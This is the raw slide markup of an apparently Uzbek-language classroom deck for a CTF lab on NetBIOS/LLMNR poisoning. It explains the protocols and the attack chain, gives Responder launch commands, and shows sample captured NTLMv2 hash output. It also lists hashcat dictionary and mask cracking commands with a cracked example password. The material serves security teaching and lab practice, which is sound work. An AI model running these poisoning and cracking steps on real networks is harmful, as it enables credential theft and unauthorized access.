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FF41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4320"/>
            <a:ext cx="1280160" cy="41148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7432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🚩 CTF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NetBIOS &amp; LLMNR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ZAHARLANISHI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1371600" y="2514600"/>
            <a:ext cx="6400800" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141D35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0" y="251460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3E0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Tarmoq Hujumlari va Himoya Usullari | 1.5 Soatlik Amaliy Dars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182880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364992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FF41"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CTF LAB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3337560"/>
            <a:ext cx="182880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60320" y="3364992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560320" y="374904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FF41"/>
                </a:solidFill>
              </a:rPr>
              <a:t>90 DAQIQA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337560"/>
            <a:ext cx="182880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3364992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663440" y="374904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FF41"/>
                </a:solidFill>
              </a:rPr>
              <a:t>KALI + WIN11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3337560"/>
            <a:ext cx="182880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66560" y="3364992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766560" y="3749040"/>
            <a:ext cx="18288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FF41"/>
                </a:solidFill>
              </a:rPr>
              <a:t>FLAG YUTISH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A4"/>
                </a:solidFill>
              </a:rPr>
              <a:t>[ OFFENSIVE SECURITY EDUCATION ] | Kiberxavfsizlik Ta'lim Markazi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DARS REJASI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</a:rPr>
              <a:t>1.5 soatlik ish rejasi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141D35"/>
          </a:solidFill>
          <a:ln w="1905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914400" cy="475488"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="00FF41">
              <a:alpha val="2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005840"/>
            <a:ext cx="5943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🌐 Kirish: Tarmoq protokollari haqida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0" y="1005840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FF41"/>
                </a:solidFill>
              </a:rPr>
              <a:t>10 daqiqa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8595360" cy="475488"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141D35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554480"/>
            <a:ext cx="914400" cy="47548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54480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1554480"/>
            <a:ext cx="5943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📡  NetBIOS nima? Qanday ishlaydi?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1554480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D4FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>15 daqiqa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8595360" cy="475488"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141D35"/>
          </a:solidFill>
          <a:ln w="1905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03120"/>
            <a:ext cx="914400" cy="475488"/>
          </a:xfrm>
          <a:prstGeom prst="rect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03120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2103120"/>
            <a:ext cx="5943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🔍   LLMNR nima? Qanday ishlaydi?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2103120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D700"/>
                </a:solidFill>
              </a:rPr>
              <a:t>15 daqiqa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651760"/>
            <a:ext cx="8595360" cy="475488"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141D35"/>
          </a:solidFill>
          <a:ln w="1905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solidFill>
            <a:srgbClr val="FF4444">
              <a:alpha val="20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00:40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651760"/>
            <a:ext cx="5943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☠️ Zaharlanish hujumi mexanizmi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2651760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4444"/>
                </a:solidFill>
              </a:rPr>
              <a:t>15 daqiqa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8595360" cy="475488"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141D35"/>
          </a:solidFill>
          <a:ln w="1905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00400"/>
            <a:ext cx="914400" cy="475488"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FF8C00">
              <a:alpha val="2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00400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00:55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80160" y="3200400"/>
            <a:ext cx="5943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🛠️  Responder vositasi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3200400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8C00"/>
                </a:solidFill>
              </a:rPr>
              <a:t>10 daqiqa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749040"/>
            <a:ext cx="8595360" cy="475488"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141D35"/>
          </a:solidFill>
          <a:ln w="1905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749040"/>
            <a:ext cx="914400" cy="475488"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="00FF41">
              <a:alpha val="2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749040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80160" y="3749040"/>
            <a:ext cx="5943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🚩   CTF LAB: Flags yutish!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0" y="3749040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FF41"/>
                </a:solidFill>
              </a:rPr>
              <a:t>25 daqiqa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297680"/>
            <a:ext cx="8595360" cy="475488"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141D35"/>
          </a:solidFill>
          <a:ln w="1905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297680"/>
            <a:ext cx="914400" cy="475488"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/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297680"/>
            <a:ext cx="9144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01:30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80160" y="4297680"/>
            <a:ext cx="5943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🛡️   Himoya usullari va yakunlash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0" y="4297680"/>
            <a:ext cx="1463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59B6"/>
                </a:solidFill>
              </a:rPr>
              <a:t>5 daqiqa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FF41"/>
                </a:solidFill>
              </a:rPr>
              <a:t>MODUL 1: KIRISH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Tarmoq Protokollari Asoslari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731520"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1A0000"/>
          </a:solidFill>
          <a:ln w="254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8595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700"/>
                </a:solidFill>
              </a:rPr>
              <a:t>❓ SAVOL: Kompyuter "DESKTOP-XYZ123" nomini qanday IP ga tarjima qiladi?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2926080" cy="2560320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141D35"/>
          </a:solidFill>
          <a:ln w="254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57400"/>
            <a:ext cx="2926080" cy="50292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5740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265176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3E0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Domain Name System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3E0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Internet va korporativ tarmoqlarda asosiy nom echimi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9272" y="2057400"/>
            <a:ext cx="2926080" cy="2560320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141D35"/>
          </a:solidFill>
          <a:ln w="254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2057400"/>
            <a:ext cx="2926080" cy="502920"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="00FF41">
              <a:alpha val="3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05740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NetBIOS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56432" y="2651760"/>
            <a:ext cx="265176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3E0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Network Basic I/O System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3E0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Mahalliy tarmoqda Windows kompyuter nomlari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63970" y="2057400"/>
            <a:ext cx="2566035" cy="2560320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141D35"/>
          </a:solidFill>
          <a:ln w="2540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63970" y="2057400"/>
            <a:ext cx="2552700" cy="502920"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FF8C00">
              <a:alpha val="3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3970" y="2057400"/>
            <a:ext cx="258445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LLMNR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01384" y="2651760"/>
            <a:ext cx="265176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D3E0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Link-Local Multicast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3E0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DNS ishlamasa muqobil hal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444"/>
                </a:solidFill>
              </a:rPr>
              <a:t>⚠️  NetBIOS va LLMNR - HACKER'lar sevgan ZAIF PROTOKOLLAR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D4FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>MODUL 2: NetBIOS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Nima? Qanday Ishlaydi?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280160"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141D35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📖  Ta'rif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3840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NetBIOS (Network Basic Input/Output System) — 1983 yilda IBM tomonidan yaratilgan, mahalliy tarmoqlarda kompyuter nomlarini IP manzillarga tarjima qiluvchi protokol.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206240" cy="1280160"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141D35"/>
          </a:solidFill>
          <a:ln w="1905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🔌  Portlar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481328"/>
            <a:ext cx="1097280" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect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481328"/>
            <a:ext cx="10972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137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481328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NetBIOS Name Service (NBNS)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755648"/>
            <a:ext cx="1097280" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect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755648"/>
            <a:ext cx="10972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138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755648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NetBIOS Datagram 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029968"/>
            <a:ext cx="1097280" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="rect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029968"/>
            <a:ext cx="10972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139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029968"/>
            <a:ext cx="2743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NetBIOS Session Service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51460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41"/>
                </a:solidFill>
              </a:rPr>
              <a:t>⚙️  NBNS Qanday Ishlaydi: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1508760" cy="1280160"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1A2540"/>
          </a:solidFill>
          <a:ln w="254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834640"/>
            <a:ext cx="15087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Kompyuter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'SERVER1'ni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izlaydi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2834640"/>
            <a:ext cx="9144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2A4"/>
                </a:solidFill>
              </a:rPr>
              <a:t>───▶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840480" y="2834640"/>
            <a:ext cx="1508760" cy="1280160"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1A2540"/>
          </a:solidFill>
          <a:ln w="254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2834640"/>
            <a:ext cx="15087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Broadcast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255.255.255.255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UDP:137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2834640"/>
            <a:ext cx="9144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2A4"/>
                </a:solidFill>
              </a:rPr>
              <a:t>───▶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0" y="2834640"/>
            <a:ext cx="1508760" cy="1280160"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1A2540"/>
          </a:solidFill>
          <a:ln w="254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2834640"/>
            <a:ext cx="15087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'SERVER1'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= 192.168.1.10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ulashiladi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444"/>
                </a:solidFill>
              </a:rPr>
              <a:t>⚠️  MUAMMO: Broadcast javoblarni hech kim tekshirmaydi! Har kim javob bera oladi!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solidFill>
            <a:srgbClr val="1A0000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444"/>
                </a:solidFill>
              </a:rPr>
              <a:t>⚠️  MUAMMO: Broadcast javoblarni hech kim tekshirmaydi! Har kim javob bera oladi!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8C00"/>
                </a:solidFill>
              </a:rPr>
              <a:t>MODUL 3: LLMNR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Link-Local Multicast Name Resolution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2286000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141D35"/>
          </a:solidFill>
          <a:ln w="1905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00"/>
                </a:solidFill>
              </a:rPr>
              <a:t>📋  LLMNR Asosiy Ma'lumotlar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📅  RFC 4795 (2007) standarti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65376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🔌  UDP/TCP port 5355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57984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📡  IPv4: 224.0.0.252 (multicast)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📡  IPv6: FF02::1:3 (multicast)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🪟  Windows Vista+ da mavjud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03580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⚡  DNS ishlamasa avtomatik ishga tushadi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206240" cy="2286000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141D35"/>
          </a:solidFill>
          <a:ln w="1905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17043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🔄 DNS Fallback Jarayoni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</a:rPr>
              <a:t>1️⃣  DNS so'rovi yuborildi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9202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444"/>
                </a:solidFill>
              </a:rPr>
              <a:t>❌  DNS javob bermadi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267712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C00"/>
                </a:solidFill>
              </a:rPr>
              <a:t>2️⃣  LLMNR multicast yuborildi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615184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444"/>
                </a:solidFill>
              </a:rPr>
              <a:t>❌  LLMNR javob bermadi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962656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</a:rPr>
              <a:t>3️⃣  NBT-NS broadcast yuborildi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NetBIOS vs LLMNR Farqlari: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858768"/>
            <a:ext cx="278892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58768"/>
            <a:ext cx="2788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Xususiyat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3858768"/>
            <a:ext cx="2788920" cy="347472"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="00FF41">
              <a:alpha val="3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858768"/>
            <a:ext cx="2788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NetBIOS/NBNS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3858768"/>
            <a:ext cx="2788920" cy="347472"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FF8C00">
              <a:alpha val="3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858768"/>
            <a:ext cx="2788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LLMNR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24528"/>
            <a:ext cx="2788920" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141D35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24528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08960" y="4224528"/>
            <a:ext cx="2788920" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141D35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4224528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41"/>
                </a:solidFill>
              </a:rPr>
              <a:t>UDP 137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4224528"/>
            <a:ext cx="2788920" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141D35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4224528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</a:rPr>
              <a:t>UDP 5355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443984"/>
            <a:ext cx="278892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443984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Uslub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08960" y="4443984"/>
            <a:ext cx="278892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4443984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41"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Broadcast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4443984"/>
            <a:ext cx="278892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4443984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</a:rPr>
              <a:t>Multicast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663440"/>
            <a:ext cx="2788920" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141D35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663440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Protokol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08960" y="4663440"/>
            <a:ext cx="2788920" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141D35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4663440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41"/>
                </a:solidFill>
              </a:rPr>
              <a:t>IPv4 only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43600" y="4663440"/>
            <a:ext cx="2788920" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141D35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4663440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</a:rPr>
              <a:t>IPv4 + IPv6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882896"/>
            <a:ext cx="278892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82896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Yosh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08960" y="4882896"/>
            <a:ext cx="278892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4882896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41"/>
                </a:solidFill>
              </a:rPr>
              <a:t>1983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0" y="4882896"/>
            <a:ext cx="2788920" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1A2540"/>
          </a:solidFill>
          <a:ln w="6350">
            <a:solidFill>
              <a:srgbClr val="2A35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0" y="4882896"/>
            <a:ext cx="27889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</a:rPr>
              <a:t>2007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4444"/>
                </a:solidFill>
              </a:rPr>
              <a:t>MODUL 4: HUJUM MEXANIZMI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NetBIOS/LLMNR Zaharlanish Hujumi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463040" cy="1097280"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141D35"/>
          </a:solidFill>
          <a:ln w="317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4630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Jabrlanuvchi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(Windows 11)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188720"/>
            <a:ext cx="1554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</a:rPr>
              <a:t>Noto'g'ri nom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</a:rPr>
              <a:t>yuboradi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D700"/>
                </a:solidFill>
              </a:rPr>
              <a:t>───▶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188720"/>
            <a:ext cx="1554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</a:rPr>
              <a:t>Tarmoqqa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</a:rPr>
              <a:t>broadcast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8C00"/>
                </a:solidFill>
              </a:rPr>
              <a:t>───▶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1188720"/>
            <a:ext cx="1463040" cy="1097280"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141D35"/>
          </a:solidFill>
          <a:ln w="3175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1188720"/>
            <a:ext cx="14630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HACKER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(Kali Linux)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0" y="1188720"/>
            <a:ext cx="1554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</a:rPr>
              <a:t>"Men!"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</a:rPr>
              <a:t>deb javob beradi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</a:rPr>
              <a:t>───▶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42316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</a:rPr>
              <a:t>🔬 Batafsil Hujum Bosqichlari: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816352"/>
            <a:ext cx="859536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16352"/>
            <a:ext cx="1097280" cy="34747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16352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Qadam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816352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3E0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Foydalanuvchi mavjud bo'lmagan resursga murojaat qiladi (\\FILSERVER\share)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859536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18688"/>
            <a:ext cx="1097280" cy="347472"/>
          </a:xfrm>
          <a:prstGeom prst="rect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18688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Qadam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3218688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3E0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DNS serveri javob bera olmaydi → LLMNR/NBT-NS so'rovi yuboriladi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859536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21024"/>
            <a:ext cx="1097280" cy="347472"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FF8C00">
              <a:alpha val="25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621024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Qadam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3621024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3E0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Responder vositasi eshitib turadi va jabrlanuvchiga 'Men o'sha serverман!' deb javob beradi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023360"/>
            <a:ext cx="859536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23360"/>
            <a:ext cx="1097280" cy="347472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23360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Qadam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4023360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3E0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Windows avtomatik NTLM autentifikatsiyasini boshlaydi → Hash yuboriladi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425696"/>
            <a:ext cx="859536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425696"/>
            <a:ext cx="1097280" cy="347472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425696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Qadam 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63040" y="4425696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3E0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Hacker NTLMv2 hash qo'lga kiritadi → Hashcat/John bilan buziladi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444"/>
                </a:solidFill>
              </a:rPr>
              <a:t>💀 NATIJA: Hacker NTLM hash → Parol → Tarmoqqa kirish!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59B6"/>
                </a:solidFill>
              </a:rPr>
              <a:t>NTLM AUTENTIFIKATSIYA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Nima uchun Hash Xavfli?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1280160"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141D35"/>
          </a:solidFill>
          <a:ln w="254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6517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Mijoz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Serverga ulanmoqchi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1280160"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141D35"/>
          </a:solidFill>
          <a:ln w="254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97280"/>
            <a:ext cx="26517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CHALLENGE yuboradi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(tasodifiy 8 bayt)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651760" cy="1280160"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141D35"/>
          </a:solidFill>
          <a:ln w="254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097280"/>
            <a:ext cx="26517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Mijoz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Paroldan HASH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hisoblaydi + yuboradi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1097280"/>
            <a:ext cx="1371600" cy="1280160"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141D35"/>
          </a:solidFill>
          <a:ln w="254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0" y="1097280"/>
            <a:ext cx="1371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HACKER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Hashni tutib oladi!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→ Offline buzish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56032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🔑 Hash Turlari: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2743200" cy="1645920"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141D35"/>
          </a:solidFill>
          <a:ln w="254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2743200" cy="411480"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FF4444">
              <a:alpha val="30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7180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 Hash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456432"/>
            <a:ext cx="2468880" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FF4444">
              <a:alpha val="15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5643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444"/>
                </a:solidFill>
              </a:rPr>
              <a:t>⚠️ JUDA XAVFLI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7947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Eski Windows. Har qanday parol &lt;5 daqiqada buziladi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971800"/>
            <a:ext cx="2743200" cy="1645920"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141D35"/>
          </a:solidFill>
          <a:ln w="2540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2971800"/>
            <a:ext cx="2743200" cy="411480"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FF8C00">
              <a:alpha val="3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97180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NTLM Hash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3456432"/>
            <a:ext cx="2468880" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FF8C00">
              <a:alpha val="15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45643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8C00"/>
                </a:solidFill>
              </a:rPr>
              <a:t>⚠️ XAVFLI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7947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Modern Windows. Hashcat GPU bilan tez buziladi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743200" cy="1645920"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141D35"/>
          </a:solidFill>
          <a:ln w="254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743200" cy="411480"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFD700">
              <a:alpha val="3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97180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NTLMv2 Hash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3456432"/>
            <a:ext cx="2468880" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFD700">
              <a:alpha val="1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45643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700"/>
                </a:solidFill>
              </a:rPr>
              <a:t>⚠️ NISBATAN XAVFLI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3794760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Challenge-Response. Pass-the-Hash ishlamaydi, lekin buziladi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011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hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt --force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FF41"/>
                </a:solidFill>
              </a:rPr>
              <a:t>MODUL 5: RESPONDER VOSITASI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Kali Linux'ning Eng Kuchli Qurollaridan Biri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97680" cy="777240"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141D35"/>
          </a:solidFill>
          <a:ln w="1905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685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1143000"/>
            <a:ext cx="34747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LLMNR Poisoning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444752"/>
            <a:ext cx="34747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LLMNR so'rovlariga soxta javob beradi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297680" cy="777240"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141D35"/>
          </a:solidFill>
          <a:ln w="1905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97280"/>
            <a:ext cx="685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22392" y="1143000"/>
            <a:ext cx="34747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NBT-NS Poisoning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22392" y="1444752"/>
            <a:ext cx="34747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NetBIOS broadcast zaharlanishi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93392"/>
            <a:ext cx="4297680" cy="777240"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141D35"/>
          </a:solidFill>
          <a:ln w="1905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1993392"/>
            <a:ext cx="685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87552" y="2039112"/>
            <a:ext cx="34747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MDNS Poisoning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2340864"/>
            <a:ext cx="34747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Multicast DNS zaharlanishi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993392"/>
            <a:ext cx="4297680" cy="777240"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141D35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993392"/>
            <a:ext cx="685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22392" y="2039112"/>
            <a:ext cx="34747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Hash Capture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22392" y="2340864"/>
            <a:ext cx="34747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NTLM/NTLMv2 hashlarni ushlaydi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889504"/>
            <a:ext cx="4297680" cy="777240"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141D35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889504"/>
            <a:ext cx="685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7552" y="2935224"/>
            <a:ext cx="34747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SMB Server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236976"/>
            <a:ext cx="34747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Soxta SMB server yaratadi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9504"/>
            <a:ext cx="4297680" cy="777240"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141D35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2889504"/>
            <a:ext cx="685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22392" y="2935224"/>
            <a:ext cx="347472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 Server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22392" y="3236976"/>
            <a:ext cx="34747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Soxta HTTP server yaratadi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50208"/>
            <a:ext cx="8595360" cy="1005840"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="001100"/>
          </a:solidFill>
          <a:ln w="1905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3977640"/>
            <a:ext cx="841248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responder -I eth0 -rdwv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eth0   </a:t>
            </a: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Network interfeys (eth0/eth1/wlan0)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-rdw      </a:t>
            </a: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ROGUE DHCP, DNS, WPAD yoqish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       </a:t>
            </a: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Verbose mode (batafsil)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RESPONDER: Natijalar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4023360"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="001100"/>
          </a:solidFill>
          <a:ln w="1905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8595360" cy="292608"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0033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0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41"/>
                </a:solidFill>
              </a:rPr>
              <a:t>● ● ●   root@kali: ~  — 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Responder v3.1.3.0 Started!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Listening for events...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[LLMNR]  Poisoned answer sent to 192.168.1.105 for name FILESERVER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[NBT-NS] Poisoned answer sent to 192.168.1.105 for name FILESERVER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72491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[SMB] NTLMv2-SSP Client   : 192.168.1.105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99923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[SMB] NTLMv2-SSP Username : CORP\john.smith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27355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[SMB] NTLMv2-SSP Hash     : john.smith::CORP:a87f3b2c9e14d065:F3A1...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54787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822192"/>
            <a:ext cx="8321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HASH SAQLANDI: /usr/share/responder/logs/SMB-NTLMv2-*.txt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8503920" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="330000"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="FF444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HASH BUZISH: Hashcat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</a:rPr>
              <a:t>NTLMv2 hashini oddiy matnga aylantirish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</a:rPr>
              <a:t>🔑 Hashcat Asosiy Buyruqlar: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4297680" cy="384048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44752"/>
            <a:ext cx="1188720" cy="384048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44752"/>
            <a:ext cx="1188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 5600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444752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NTLMv2 hash (Responder'dan)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44752"/>
            <a:ext cx="4297680" cy="384048"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141D35"/>
          </a:solidFill>
          <a:ln w="1270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44752"/>
            <a:ext cx="1188720" cy="384048"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FF8C00">
              <a:alpha val="25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444752"/>
            <a:ext cx="1188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 1000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9320" y="1444752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NTLM hash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901952"/>
            <a:ext cx="4297680" cy="384048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01952"/>
            <a:ext cx="1188720" cy="384048"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="00FF41">
              <a:alpha val="25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01952"/>
            <a:ext cx="1188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 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1901952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Dictionary hujumi (wordlist)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901952"/>
            <a:ext cx="4297680" cy="384048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901952"/>
            <a:ext cx="1188720" cy="384048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901952"/>
            <a:ext cx="1188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1901952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Brute force hujumi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8595360" cy="731520"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="001100"/>
          </a:solidFill>
          <a:ln w="19050">
            <a:solidFill>
              <a:srgbClr val="00FF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87168"/>
            <a:ext cx="832104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hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt --force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hashcat -m 5600 hashes.txt -a 3 ?u?l?l?l?d?d --force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10128"/>
            <a:ext cx="8595360" cy="822960"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="001100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337560"/>
            <a:ext cx="8321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john.smith::CORP:a87f3b2c9e14d065:...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1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Password123!</a:t>
            </a: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Session..........: hashcat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Status...........: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Cracked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251960"/>
            <a:ext cx="8595360" cy="713232"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1A0000"/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79392"/>
            <a:ext cx="8412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4444"/>
                </a:solidFill>
              </a:rPr>
              <a:t>⚠️  OGOHLANTIRISH: Ushbu usullar faqat ruxsat berilgan tizimlar va ta'lim maqsadlarida qo'llanilsin!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4444"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Ruxsatsiz tarmoqlarga hujum qilish qonuniy jihatdan javobgarlikka tortiladi.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1234440"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0D1A0D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82880"/>
            <a:ext cx="9144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🚩 CTF LAB: O'RNATISH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731520"/>
            <a:ext cx="9144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4"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Capture The Flag | Laboratoriya Muhitini Sozlash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444752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🖧 LAB TOPOLOGIYASI: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834640" cy="1874520"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141D35"/>
          </a:solidFill>
          <a:ln w="254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28800"/>
            <a:ext cx="2834640" cy="384048"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
